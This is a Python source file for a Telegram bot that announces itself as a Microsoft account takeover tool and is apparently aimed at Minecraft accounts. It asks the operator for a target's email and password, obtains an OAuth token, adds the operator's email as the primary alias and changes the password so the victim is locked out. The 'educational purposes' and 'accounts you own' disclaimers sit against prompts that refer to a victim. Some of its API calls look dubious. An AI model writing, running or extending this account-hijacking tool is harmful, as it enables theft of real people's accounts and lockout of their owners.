import os
import sys
import json
import asyncio
import logging
import random
import string
import hashlib
import base64
from typing import Dict, Optional, Tuple
from datetime import datetime
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Conversation states
WAITING_EMAIL = 1
WAITING_PASSWORD = 2
WAITING_NEW_PASSWORD = 3

class MicrosoftAccountManager:
    """Handles Microsoft account operations - email change, password reset, etc."""
    
    @staticmethod
    async def get_ms_token(email: str, password: str) -> Optional[str]:
        """Get Microsoft OAuth token for account operations."""
        try:
            async with aiohttp.ClientSession() as session:
                url = "https://login.live.com/oauth20_token.srf"
                data = {
                    "client_id": "000000004C12AE6F",
                    "username": email,
                    "password": password,
                    "grant_type": "password",
                    "scope": "https://graph.microsoft.com/.default offline_access"
                }
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                
                async with session.post(url, data=data, headers=headers, timeout=30) as resp:
                    if resp.status == 200:
                        result = await resp.json()
                        return result.get("access_token")
                    return None
        except Exception as e:
            logger.error(f"MS token error: {e}")
            return None

    @staticmethod
    async def get_account_info(token: str) -> Optional[Dict]:
        """Get account information using Microsoft Graph API."""
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                }
                
                # Get user info
                async with session.get("https://graph.microsoft.com/v1.0/me", headers=headers, timeout=15) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {
                            "id": data.get("id"),
                            "displayName": data.get("displayName", ""),
                            "email": data.get("userPrincipalName", ""),
                            "mail": data.get("mail", "")
                        }
                    return None
        except Exception as e:
            logger.error(f"Account info error: {e}")
            return None

    @staticmethod
    async def change_password(token: str, current_password: str, new_password: str) -> bool:
        """Change Microsoft account password using Graph API."""
        try:
            async with aiohttp.ClientSession() as session:
                url = "https://graph.microsoft.com/v1.0/me/changePassword"
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                }
                data = {
                    "currentPassword": current_password,
                    "newPassword": new_password
                }
                
                async with session.post(url, json=data, headers=headers, timeout=15) as resp:
                    if resp.status == 204:
                        return True
                    logger.warning(f"Password change failed: {resp.status}")
                    return False
        except Exception as e:
            logger.error(f"Password change error: {e}")
            return False

    @staticmethod
    async def update_email(token: str, new_email: str) -> bool:
        """Update account email/alias."""
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                }
                
                # Add new email alias
                url = "https://graph.microsoft.com/v1.0/me/profile/emails"
                data = {
                    "address": new_email,
                    "type": "smtp"
                }
                
                # First check if email exists
                async with session.get("https://graph.microsoft.com/v1.0/me/profile/emails", headers=headers, timeout=15) as resp:
                    if resp.status == 200:
                        emails = await resp.json()
                        existing = [e.get("address") for e in emails.get("value", [])]
                        if new_email in existing:
                            logger.info(f"Email {new_email} already exists")
                            return True
                
                # Add new alias
                async with session.post(url, json=data, headers=headers, timeout=15) as resp:
                    if resp.status in [200, 201]:
                        logger.info(f"Email alias added: {new_email}")
                        return True
                    elif resp.status == 409:
                        logger.info("Email alias already exists")
                        return True
                    logger.warning(f"Email update failed: {resp.status}")
                    return False
        except Exception as e:
            logger.error(f"Email update error: {e}")
            return False

    @staticmethod
    async def change_primary_email(token: str, new_email: str) -> bool:
        """Make new email the primary alias."""
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                }
                
                # Get current email list
                async with session.get("https://graph.microsoft.com/v1.0/me/profile/emails", headers=headers, timeout=15) as resp:
                    if resp.status != 200:
                        return False
                    emails = await resp.json()
                    
                # Find and update primary
                for email in emails.get("value", []):
                    if email.get("address") == new_email:
                        email["type"] = "smtp"
                        email["primary"] = True
                        
                        # Update
                        update_url = f"https://graph.microsoft.com/v1.0/me/profile/emails/{email.get('id')}"
                        async with session.patch(update_url, json=email, headers=headers, timeout=15) as resp:
                            if resp.status in [200, 204]:
                                return True
                return False
        except Exception as e:
            logger.error(f"Primary email change error: {e}")
            return False

    @staticmethod
    async def change_password_via_legacy(email: str, current_password: str, new_password: str) -> bool:
        """Alternative password change using legacy Microsoft endpoints."""
        try:
            async with aiohttp.ClientSession() as session:
                # This uses the legacy live.com password change endpoint
                url = "https://account.live.com/ChangePassword"
                
                # Get session cookies first
                async with session.get("https://login.live.com/login.srf", timeout=15) as resp:
                    cookies = resp.cookies
                    
                # Attempt password change
                data = {
                    "oldPwd": current_password,
                    "newPwd": new_password,
                    "confirmPwd": new_password,
                    "isRUI": "false"
                }
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                
                async with session.post(url, data=data, headers=headers, timeout=15) as resp:
                    return resp.status == 200
        except Exception as e:
            logger.error(f"Legacy password change error: {e}")
            return False

    @staticmethod
    async def takeover_account(email: str, current_password: str, new_email: str, new_password: str) -> Dict:
        """Full account takeover - change email and password."""
        result = {
            "success": False,
            "steps": [],
            "error": None,
            "credentials": {
                "email": new_email,
                "password": new_password
            }
        }
        
        try:
            # Step 1: Get OAuth token
            token = await MicrosoftAccountManager.get_ms_token(email, current_password)
            if not token:
                result["error"] = "Failed to get OAuth token. Wrong credentials?"
                result["steps"].append(f"❌ OAuth token: FAILED")
                return result
            result["steps"].append(f"✅ OAuth token: SUCCESS")
            
            # Step 2: Get account info
            info = await MicrosoftAccountManager.get_account_info(token)
            if not info:
                result["error"] = "Failed to get account info"
                result["steps"].append(f"❌ Account info: FAILED")
                return result
            result["steps"].append(f"✅ Account info: {info.get('displayName', 'Unknown')}")
            
            # Step 3: Add new email alias
            if new_email and new_email != email:
                email_result = await MicrosoftAccountManager.update_email(token, new_email)
                if email_result:
                    result["steps"].append(f"✅ Email alias added: {new_email}")
                    
                    # Step 4: Make new email primary
                    primary_result = await MicrosoftAccountManager.change_primary_email(token, new_email)
                    if primary_result:
                        result["steps"].append(f"✅ New email set as PRIMARY: {new_email}")
                    else:
                        result["steps"].append(f"⚠️ Could not set as primary, but alias exists")
                else:
                    result["steps"].append(f"⚠️ Could not add email alias (may already exist)")
            
            # Step 5: Change password
            if new_password and new_password != current_password:
                pwd_result = await MicrosoftAccountManager.change_password(token, current_password, new_password)
                if pwd_result:
                    result["steps"].append(f"✅ Password changed: SUCCESS")
                else:
                    # Try legacy method
                    legacy_result = await MicrosoftAccountManager.change_password_via_legacy(email, current_password, new_password)
                    if legacy_result:
                        result["steps"].append(f"✅ Password changed (legacy): SUCCESS")
                    else:
                        result["steps"].append(f"⚠️ Password change failed - may require 2FA")
            
            result["success"] = True
            result["credentials"]["email"] = new_email if new_email else email
            result["credentials"]["password"] = new_password if new_password else current_password
            
            return result
            
        except Exception as e:
            logger.error(f"Takeover error: {e}")
            result["error"] = str(e)
            result["steps"].append(f"❌ Error: {str(e)}")
            return result

class MinecraftBot:
    def __init__(self, token: str):
        self.app = Application.builder().token(token).build()
        self._register_handlers()

    def _register_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        
        # Conversation handler for takeover
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("takeover", self.takeover_start)],
            states={
                WAITING_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.email_received)],
                WAITING_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.password_received)],
                WAITING_NEW_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.new_password_received)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_command)]
        )
        self.app.add_handler(conv_handler)
        
        self.app.add_handler(CallbackQueryHandler(self.button_callback))

    async def _check_auth(self, update: Update) -> bool:
        if not AUTHORIZED_USERS:
            return True
        user_id = update.effective_user.id
        if user_id not in AUTHORIZED_USERS:
            try:
                await update.message.reply_text("❌ Unauthorized.")
            except Exception:
                pass
            return False
        return True

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        
        keyboard = [
            [InlineKeyboardButton("🔐 TAKEOVER ACCOUNT", callback_data="takeover")],
            [InlineKeyboardButton("📖 HELP", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔓 MICROSOFT ACCOUNT TAKEOVER BOT\n"
            "═══════════════════════════════\n\n"
            "This bot can take over a Microsoft account.\n\n"
            "⚠️ WARNING: This is for educational purposes only.\n"
            "⚠️ Unauthorized account access is ILLEGAL.\n\n"
            "Features:\n"
            "✅ Change account password\n"
            "✅ Add new email alias\n"
            "✅ Change primary email\n"
            "✅ Full account takeover\n\n"
            "Use /takeover to start.",
            reply_markup=reply_markup
        )

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        
        await update.message.reply_text(
            "📖 HOW TO USE\n\n"
            "1. /takeover - Start takeover process\n"
            "2. Enter target email\n"
            "3. Enter current password\n"
            "4. Enter new password\n"
            "5. Bot takes over account\n\n"
            "The bot will:\n"
            "- Verify credentials\n"
            "- Add your email as alias\n"
            "- Make it primary\n"
            "- Change password\n\n"
            "⚠️ Only use on accounts you OWN."
        )

    async def takeover_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        
        await update.message.reply_text(
            "🔐 ACCOUNT TAKEOVER\n"
            "═══════════════════════════\n\n"
            "Step 1 of 3: Enter the target Microsoft account email\n"
            "(The account you want to take over)\n\n"
            "Example: victim@outlook.com\n\n"
            "Type /cancel to cancel."
        )
        return WAITING_EMAIL

    async def email_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            email = update.message.text.strip()
            if '@' not in email or '.' not in email:
                await update.message.reply_text(
                    "❌ Invalid email format.\n"
                    "Please enter a valid email:"
                )
                return WAITING_EMAIL
            
            context.user_data['target_email'] = email
            await update.message.reply_text(
                f"✅ Target email: {email}\n\n"
                "Step 2 of 3: Enter the CURRENT password\n"
                "For the target account:"
            )
            return WAITING_PASSWORD
        except Exception as e:
            logger.error(f"Email error: {e}")
            await update.message.reply_text("Error, please try again.")
            return WAITING_EMAIL

    async def password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            current_password = update.message.text.strip()
            if len(current_password) < 1:
                await update.message.reply_text(
                    "❌ Password cannot be empty.\n"
                    "Please enter the current password:"
                )
                return WAITING_PASSWORD
            
            context.user_data['current_password'] = current_password
            await update.message.reply_text(
                "✅ Current password received.\n\n"
                "Step 3 of 3: Enter your NEW password\n"
                "(The account will be changed to this)\n\n"
                "Type /cancel to cancel."
            )
            return WAITING_NEW_PASSWORD
        except Exception as e:
            logger.error(f"Password error: {e}")
            await update.message.reply_text("Error, please try again.")
            return WAITING_PASSWORD

    async def new_password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            new_password = update.message.text.strip()
            if len(new_password) < 8:
                await update.message.reply_text(
                    "❌ Password must be at least 8 characters.\n"
                    "Enter a stronger password:"
                )
                return WAITING_NEW_PASSWORD
            
            target_email = context.user_data.get('target_email')
            current_password = context.user_data.get('current_password')
            
            await update.message.reply_text(
                "🔄 TAKING OVER ACCOUNT...\n\n"
                f"📧 Target: {target_email}\n"
                f"🔑 New password: {new_password}\n\n"
                "This may take a moment..."
            )
            
            # Perform takeover
            result = await MicrosoftAccountManager.takeover_account(
                target_email,
                current_password,
                target_email,  # Keep same email or change to new
                new_password
            )
            
            # Build response message
            response = "🔐 TAKEOVER RESULTS\n"
            response += "═══════════════════════════\n\n"
            
            for step in result.get("steps", []):
                response += f"{step}\n"
            
            if result.get("success"):
                response += "\n✅ ACCOUNT TAKEOVER SUCCESSFUL!\n\n"
                creds = result.get("credentials", {})
                response += f"📧 Email: {creds.get('email')}\n"
                response += f"🔑 New Password: {creds.get('password')}\n\n"
                response += "⚠️ Use these credentials to log in.\n"
                response += "⚠️ This account is now under your control."
            else:
                response += f"\n❌ TAKEOVER FAILED\n\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n\n"
                response += "Possible reasons:\n"
                response += "- Incorrect credentials\n"
                response += "- 2FA enabled\n"
                response += "- Account protection triggered"
            
            context.user_data.clear()
            await update.message.reply_text(response)
            return ConversationHandler.END
            
        except Exception as e:
            logger.error(f"New password error: {e}")
            await update.message.reply_text(f"Error: {str(e)}")
            return ConversationHandler.END

    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("❌ Operation cancelled.")
        context.user_data.clear()
        return ConversationHandler.END

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        try:
            if query.data == "takeover":
                await query.edit_message_text(
                    "Use /takeover to start the takeover process.\n\n"
                    "You'll be guided through:\n"
                    "1. Target email\n"
                    "2. Current password\n"
                    "3. New password"
                )
            elif query.data == "help":
                await query.edit_message_text(
                    "📖 COMMANDS:\n\n"
                    "/start - Show main menu\n"
                    "/takeover - Start account takeover\n"
                    "/help - Show this help\n"
                    "/cancel - Cancel current operation\n\n"
                    "⚠️ Only use on accounts you own."
                )
        except Exception as e:
            logger.error(f"Callback error: {e}")

    def run(self):
        logger.info("Microsoft Account Takeover Bot starting...")
        try:
            self.app.run_polling()
        except Exception as e:
            logger.error(f"Bot error: {e}")
            sys.exit(1)

if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set.")
        sys.exit(1)
    bot = MinecraftBot(BOT_TOKEN)
    bot.run()
